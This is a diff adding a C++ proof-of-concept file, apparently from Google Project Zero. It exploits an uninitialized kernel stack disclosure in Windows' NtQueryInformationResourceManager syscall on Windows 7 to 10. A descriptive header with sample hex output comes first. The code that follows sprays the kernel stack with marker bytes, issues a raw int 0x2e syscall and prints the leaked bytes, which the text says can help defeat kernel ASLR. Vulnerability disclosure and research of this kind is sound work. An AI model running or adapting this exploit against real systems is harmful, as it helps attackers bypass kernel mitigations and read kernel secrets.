@@ -1,0 +1,126 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1207
+
+We have discovered that the nt!NtQueryInformationResourceManager system call called with the 0 information class discloses portions of uninitialized kernel stack memory to user-mode clients, on Windows 7 to Windows 10.
+
+The specific name of the 0 information class or the layout of the corresponding output buffer are unknown to us; however, we have determined that on 32-bit Windows platforms, an output size of 24 bytes is accepted. At the end of that memory area, 2 uninitialized bytes from the kernel stack can be leaked to the client application.
+
+The attached proof-of-concept program (specific to Windows 10 1607 32-bit) demonstrates the disclosure by spraying the kernel stack with a large number of 0x41 ('A') marker bytes, and then calling the affected system call with infoclass=0 and the allowed output size. An example output is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 00 00 00 00 00 41 41 ?? ?? ?? ?? ?? ?? ?? ?? ......AA........
+--- cut ---
+
+It is clearly visible here that 2 bytes copied from ring-0 to ring-3 remained uninitialized. Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <KtmW32.h>
+#include <cstdio>
+
+extern "C"
+ULONG WINAPI NtMapUserPhysicalPages(
+    PVOID BaseAddress,
+    ULONG NumberOfPages,
+    PULONG PageFrameNumbers
+);
+
+// For native 32-bit execution.
+extern "C"
+ULONG CDECL SystemCall32(DWORD ApiNumber, ...) {
+  __asm{mov eax, ApiNumber};
+  __asm{lea edx, ApiNumber + 4};
+  __asm{int 0x2e};
+}
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  // Buffer allocated in static program memory, hence doesn't touch the local stack.
+  static BYTE buffer[4096];
+
+  // Fill the buffer with 'A's and spray the kernel stack.
+  MyMemset(buffer, 'A', sizeof(buffer));
+  NtMapUserPhysicalPages(buffer, sizeof(buffer) / sizeof(DWORD), (PULONG)buffer);
+
+  // Make sure that we're really not touching any user-mode stack by overwriting the buffer with 'B's.
+  MyMemset(buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  // Windows 10 1607 32-bit.
+  CONST ULONG __NR_NtQueryInformationResourceManager = 0x00b6;
+
+  // Create a volatile transaction manager.
+  HANDLE hManager = CreateTransactionManager(NULL, NULL, TRANSACTION_MANAGER_VOLATILE, 0);
+  if (hManager == INVALID_HANDLE_VALUE) {
+    printf("CreateTransactionManager failed, %d\n", GetLastError());
+    return 1;
+  }
+
+  // Create a resource manager.
+  GUID guid;
+  ZeroMemory(&guid, sizeof(guid));
+
+  HANDLE hResource = CreateResourceManager(NULL, &guid, RESOURCE_MANAGER_VOLATILE, hManager, NULL);
+  if (hResource == INVALID_HANDLE_VALUE) {
+    printf("CreateResourceManager failed, %d\n", GetLastError());
+    CloseHandle(hManager);
+    return 1;
+  }
+
+  // Spray the kernel stack to get visible results.
+  SprayKernelStack();
+
+  // Trigger the vulnerability and print out the output structure.
+  BYTE output[24] = { /* zero padding */ };
+  DWORD ReturnLength;
+  NTSTATUS st = SystemCall32(__NR_NtQueryInformationResourceManager, hResource, 0, output, sizeof(output), &ReturnLength);
+
+  if (!NT_SUCCESS(st)) {
+    printf("NtQueryInformationResourceManager failed, %x\n", st);
+    CloseHandle(hManager);
+    CloseHandle(hResource);
+    return 1;
+  }
+
+  PrintHex(output, ReturnLength);
+
+  // Free resources.
+  CloseHandle(hManager);
+  CloseHandle(hResource);
+
+  return 0;
+}
